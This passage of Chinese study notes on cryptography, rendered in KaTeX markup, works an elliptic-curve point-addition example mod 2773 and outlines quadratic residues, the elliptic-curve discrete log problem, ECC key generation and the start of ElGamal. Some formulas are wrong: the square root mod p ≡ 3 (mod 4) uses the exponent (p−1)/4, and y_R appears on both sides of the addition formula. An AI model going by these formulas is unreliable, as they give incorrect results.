style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></p><p>没什么好记忆的法子，考试前多背几遍。</p><h3 id="椭圆曲线上加法例子"><a class="markdownIt-Anchor" href="#椭圆曲线上加法例子"></a> 椭圆曲线上加法例子</h3><p><img src="https://upyun.wuuconix.link/image-20211017224713325.png" alt="ecc add example" /></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mo stretchy="false">(</mo><mn>3</mn><mo>∗</mo><mn>1</mn><mo>+</mo><mn>4</mn><mi mathvariant="normal">）</mi><mi mathvariant="normal">/</mi><mn>6</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>2773</mn></mrow><annotation encoding="application/x-tex">\alpha = (3 * 1 + 4 ）/ 6\ mod\ 2773</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mord cjk_fallback">）</span><span class="mord">/</span><span class="mord">6</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span></span></span></span>。</p><p>这里我们可以发现式子里的除法不是真的除，而是要转化为乘它的逆。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2773</mn><mo>=</mo><mn>462</mn><mo>∗</mo><mn>6</mn><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2773=462*6+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><mn>2773</mn><mo>−</mo><mn>462</mn><mo>∗</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">1 = 2773-462*6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span></span></span></span></p><p>6的逆为-462，即2311, 则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mn>2312</mn></mrow><annotation encoding="application/x-tex">\alpha = 2312</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">3</span><span class="mord">1</span><span class="mord">2</span></span></span></span>。</p><p>ok，然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo>=</mo><msup><mi>α</mi><mn>2</mn></msup><mo>−</mo><msub><mi>x</mi><mi>p</mi></msub><mo>−</mo><msub><mi>x</mi><mi>p</mi></msub><mo>=</mo><mn>1771</mn><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>2773</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_R=\alpha^2-x_p-x_p=1771\ (mod\ 2773)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mord">7</span><span class="mord">1</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mi>α</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>P</mi></msub><mo>−</mo><msub><mi>x</mi><mi>R</mi></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mn>705</mn><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>2773</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y_R=\alpha(x_P-x_R)-y_R=705\ (mod\ 2773)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">7</span><span class="mord">0</span><span class="mord">5</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span><span class="mclose">)</span></span></span></span></p><h3 id="二次剩余定义"><a class="markdownIt-Anchor" href="#二次剩余定义"></a> 二次剩余定义</h3><p><img src="https://upyun.wuuconix.link/image-20211017231128273.png" alt="二次剩余" /></p><p><img src="https://upyun.wuuconix.link/image-20211017231142717.png" alt="欧拉判别法" /></p><p>当我们判断d是p的二次剩余后，去求解x的时候，如果p是一个模4余3的素数，那么x就可以直接给出结果</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mo>±</mo><msup><mi>d</mi><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>4</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">x=\pm d^{(p-1)/4} \ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0824399999999998em;vertical-align:-0.19444em;"></span><span class="mord">±</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></p><p><img src="https://upyun.wuuconix.link/image-20211017231949987.png" alt="模4余三" /></p><h3 id="ecc中的离散对数dlp问题"><a class="markdownIt-Anchor" href="#ecc中的离散对数dlp问题"></a> ECC中的离散对数DLP问题</h3><p><img src="https://upyun.wuuconix.link/image-20211017232337114.png" alt="ECC DLP" /></p><p>在椭圆曲线群中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mo>×</mo><mi>α</mi></mrow><annotation encoding="application/x-tex">k\times\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>，对应<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">Z_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>α</mi><mi>k</mi></msup></mrow><annotation encoding="application/x-tex">\alpha ^k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span>。</p><p>在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">Z_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>下求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>很难，在椭圆曲线中也很难求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>，便以此为依据设计了一个陷门函数，形成了ECC。</p><h3 id="密钥生成"><a class="markdownIt-Anchor" href="#密钥生成"></a> 密钥生成</h3><ol><li><p>选择一个椭圆曲线E(mod p)，p是一个大素数。</p></li><li><p>选择E上的点G，使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>×</mo><mi>G</mi><mo>=</mo><mi>O</mi></mrow><annotation encoding="application/x-tex">n\times G=O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span></span></span></span></p></li><li><p>选择随机数a, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>&lt;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">a&lt;n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span></p></li><li><p>计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>P</mi><mi>A</mi></msub><mo>=</mo><mi>a</mi><mo>×</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">P_A=a\times G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span></span></span></span>。</p></li></ol><p>公钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><mi>E</mi><mo separator="true">,</mo><msub><mi>P</mi><mi>A</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p, E, P_A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，私钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>。</p></li></ol><h2 id="elgmal-2"><a class="markdownIt-Anchor" href="#elgmal-2"></a> Elgmal</h2><p>此密码和之后的椭圆曲线密码一样，都基于离散对数问题 <code>Discrete Logarithm Problem DLP</code>。</p><h3 id="公钥与私钥的产生-2"><a class="markdownIt-Anchor" href="#公钥与私钥的产生-2"></a> 公钥与私钥的产生</h3><ol><li>产生一个大素数p</li><li>选择<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">Z_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>的一个生成元g。（大概就是g的幂能够遍历<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">Z_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></li><li>选择一个随机数a, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>≤</mo><mi>a</mi><mo>≤</mo><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\leq a\leq p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li>计算<span class="katex"><span 